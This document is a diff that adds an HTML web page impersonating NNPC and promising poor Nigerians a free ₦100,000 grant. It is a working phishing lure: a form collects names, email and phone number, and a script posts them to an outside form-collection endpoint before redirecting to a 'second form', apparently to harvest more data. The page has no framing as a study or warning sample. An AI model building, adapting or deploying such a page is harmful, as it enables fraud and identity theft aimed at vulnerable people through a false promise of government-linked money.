@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Free Money Grant</title>
+  <style>
+    body {
+      background-color: #f1f1f1;
+    }
+    
+    a {
+      text-decoration: none;
+      color: white;
+    }
+    
+    * {
+      font-family: sans-serif;
+    }
+    
+    fieldset {
+      width: 250px;
+      margin-left: 30px;
+      padding: 20px;
+      background-color: white;
+      border: none;
+    }
+    
+    input {
+      width: 200px;
+      height: 35px;
+      border: none;
+      padding: 15px;
+      margin-top: 20px;
+      background: #f1f1f1;
+    }
+    
+    label {
+      color: #0b85Af;
+    }
+    
+    #submit {
+      background-color: #4CB050;
+      color: white;
+      width: 235px;
+      height: 50px;
+      border: none;
+    }
+    
+    .first {
+      margin-left: 140px;
+      color: #4CBf50 !important;
+    }
+    
+    #img {
+      border: 6px double #00ff00;
+      padding: 7px;
+      margin-top: 5px;
+    }
+    
+    #sadiq {
+      background-color: #f1f1f1;
+      border: 3px solid lightgray;
+      padding: 5px;
+    }
+    
+    #e {
+      color: red;
+      font-size: 15px;
+    }
+    
+    input:hover {
+      background-color: lightcyan;
+      border: 5px solid lightcyan;
+    }
+    
+    #just {
+      color: #0b85Af;
+    }
+  </style>
+</head>
+<body>
+  <div id="sadiq">
+    <img src="nnpc.png" width="100px" align="left" id="img">
+    <div class="first">
+      <b>NNPC GRANT TO POORS AND LESS PREVILLAGE 2023 DON'T LOOSE OUT THIS GREAT OPPORTUNITY TO GET FINANCIAL SUPPORT AS A LESS PRIVILEGED</b><br>
+    </div>
+    <img src="atrract.png" width="340px">
+  </div><br>
+  <p align="justify">
+    <b id="just">This program was done by NNPC to reduce poverty and less privileged people in the society of Nigeria.<br><br>Just enter your details now with your required information to get an opportunity for a grant of ₦100,000 for free.</p></b> <br><br>
+
+  <form action="" id="myForm" align="center" method="POST">
+    <fieldset>
+      <b id="e">ENTER YOUR DETAILS CORRECTLY</b>
+      <br><br>
+      <hr>
+      <label id="first" for="fname">
+        <b>First name</b>
+      </label><br>
+      <input type="text" name="fname" placeholder="Enter your first name here" required="required" id="fname"><br><br>
+      <label for="sname">
+        <b>Second name</b>
+      </label><br>
+      <input type="text" name="sname" id="sname" placeholder="Enter your second name here" required="required"><br><br>
+      <label for="email">
+        <b>Email</b>
+      </label><br>
+      <input type="email" id="email" name="email" placeholder="Enter your email" required="required"><br><br>
+      <label for="contact">
+        <b>Phone number</b>
+      </label>
+      <input type="number" name="contact" id="contact" placeholder="Enter your phone number" required="required"><br><br>
+      <button Id="submit">
+        <a href="submit">
+          <b>PROCEED</b></a>
+      </button>
+      <br><br>
+      <br>
+      <hr>
+      <br>
+    </fieldset>
+  </form>
+  <script>
+    function redirectToSecondForm() {
+      window.location.href = "secondform.html";
+    }
+    document.getElementById("myForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      fetch("https://formspree.io/f/mleylzez", {
+        method: "POST",
+        body: new FormData(event.target),
+        headers: {
+          Accept: "application/json",
+        },
+      })
+      .then(function(response) {
+        if (response.ok) {
+          redirectToSecondForm();
+        } else {
+          console.error("Form submission failed.");
+        }
+      })
+      .catch(function(error) {
+        console.error("Network error:", error);
+      });
+    });
+  </script>
+</body>
+</html>
